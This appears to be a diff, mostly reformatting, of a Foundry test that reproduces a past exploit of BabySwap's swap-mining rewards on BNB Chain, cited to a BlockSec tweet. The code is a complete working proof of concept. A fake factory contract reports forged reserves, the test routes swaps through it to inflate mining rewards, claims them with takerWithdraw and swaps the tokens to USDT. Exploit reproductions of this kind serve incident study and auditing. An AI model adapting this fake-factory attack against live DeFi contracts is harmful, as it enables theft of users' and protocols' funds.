@@ -3,7 +3,7 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
-import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
+import {IERC20} from "src/interfaces/IERC20.sol";
 
 import {IWBNB} from "src/interfaces/IWBNB.sol";
 import {IUSDT} from "src/interfaces/IUSDT.sol";
@@ -20,7 +20,6 @@ import {IUSDT} from "src/interfaces/IUSDT.sol";
 // Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1576441612812836865
 
 interface IBabySwapRouter {
-
     function swapExactTokensForTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -30,20 +29,18 @@ interface IBabySwapRouter {
         address to,
         uint256 deadline
     ) external;
-
 }
 
 interface ISwapMining {
-
     function takerWithdraw() external;
-
 }
 
 contract FakeFactory {
-
     address Owner;
-    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
+    IWBNB constant WBNB_TOKEN =
+        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IUSDT constant USDT_TOKEN =
+        IUSDT(0x55d398326f99059fF775485246999027B3197955);
 
     constructor() {
         Owner = msg.sender;
@@ -59,7 +56,11 @@ contract FakeFactory {
     }
 
     // fake pair
-    function getReserves() external pure returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) {
+    function getReserves()
+        external
+        pure
+        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast)
+    {
         reserve0 = 10_000_000_000 * 1e18;
         reserve1 = 1;
         blockTimestampLast = 0;
@@ -79,17 +80,21 @@ contract FakeFactory {
         }
         // if(USDT_TOKEN.balanceOf(address(this)) > 0) USDT_TOKEN.transfer(Owner, USDT_TOKEN.balanceOf(address(this)));
     }
-
 }
 
 contract ContractTest is Test {
-
-    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
-    IERC20 constant BABY_TOKEN = IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
-    IBabySwapRouter constant BABYSWAP_ROUTER = IBabySwapRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);
-    ISwapMining constant SWAP_MINING = ISwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);
-    address constant BABYSWAP_FACTORY = 0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da;
+    IWBNB constant WBNB_TOKEN =
+        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
+    IUSDT constant USDT_TOKEN =
+        IUSDT(0x55d398326f99059fF775485246999027B3197955);
+    IERC20 constant BABY_TOKEN =
+        IERC20(0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657);
+    IBabySwapRouter constant BABYSWAP_ROUTER =
+        IBabySwapRouter(0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32);
+    ISwapMining constant SWAP_MINING =
+        ISwapMining(0x5c9f1A9CeD41cCC5DcecDa5AFC317b72f1e49636);
+    address constant BABYSWAP_FACTORY =
+        0x86407bEa2078ea5f5EB5A52B2caA963bC1F889Da;
 
     function setUp() public {
         vm.createSelectFork("bsc", 21_811_979);
@@ -100,14 +105,19 @@ contract ContractTest is Test {
         vm.label(address(BABYSWAP_ROUTER), "BABYSWAP_ROUTER");
         vm.label(address(SWAP_MINING), "SWAP_MINING");
         vm.label(BABYSWAP_FACTORY, "BABYSWAP_FACTORY");
-        vm.label(0xE730C7B7470447AD4886c763247012DfD233bAfF, "USDT_BABY_BABYPAIR");
+        vm.label(
+            0xE730C7B7470447AD4886c763247012DfD233bAfF,
+            "USDT_BABY_BABYPAIR"
+        );
     }
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
+            "[Start] Attacker USDT balance before exploit",
+            USDT_TOKEN.balanceOf(address(this)),
+            18
         );
-        (bool success,) = address(WBNB_TOKEN).call{value: 20_000}("");
+        (bool success, ) = address(WBNB_TOKEN).call{value: 20_000}("");
         require(success, "Transfer failed.");
         WBNB_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);
         BABY_TOKEN.approve(address(BABYSWAP_ROUTER), type(uint256).max);
@@ -123,19 +133,37 @@ contract ContractTest is Test {
         factories[0] = address(factory);
         uint256[] memory fees = new uint256[](1);
         fees[0] = 0;
-        BABYSWAP_ROUTER.swapExactTokensForTokens(10_000, 0, path1, factories, fees, address(this), block.timestamp);
+        BABYSWAP_ROUTER.swapExactTokensForTokens(
+            10_000,
+            0,
+            path1,
+            factories,
+            fees,
+            address(this),
+            block.timestamp
+        );
         // swap token to claim reward
         address[] memory path2 = new address[](2);
         path2[0] = address(WBNB_TOKEN);
         path2[1] = address(BABY_TOKEN);
-        BABYSWAP_ROUTER.swapExactTokensForTokens(10_000, 0, path2, factories, fees, address(this), block.timestamp);
+        BABYSWAP_ROUTER.swapExactTokensForTokens(
+            10_000,
+            0,
+            path2,
+            factories,
+            fees,
+            address(this),
+            block.timestamp
+        );
 
         // claim reward token
         SWAP_MINING.takerWithdraw();
         _BABYToUSDT();
 
         emit log_named_decimal_uint(
-            "[End] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
+            "[End] Attacker USDT balance before exploit",
+            USDT_TOKEN.balanceOf(address(this)),
+            18
         );
     }
 
@@ -151,8 +179,13 @@ contract ContractTest is Test {
         uint256[] memory fees = new uint256[](1);
         fees[0] = 3000;
         BABYSWAP_ROUTER.swapExactTokensForTokens(
-            BABY_TOKEN.balanceOf(address(this)), 0, path, factories, fees, address(this), block.timestamp
+            BABY_TOKEN.balanceOf(address(this)),
+            0,
+            path,
+            factories,
+            fees,
+            address(this),
+            block.timestamp
         );
     }
-
 }
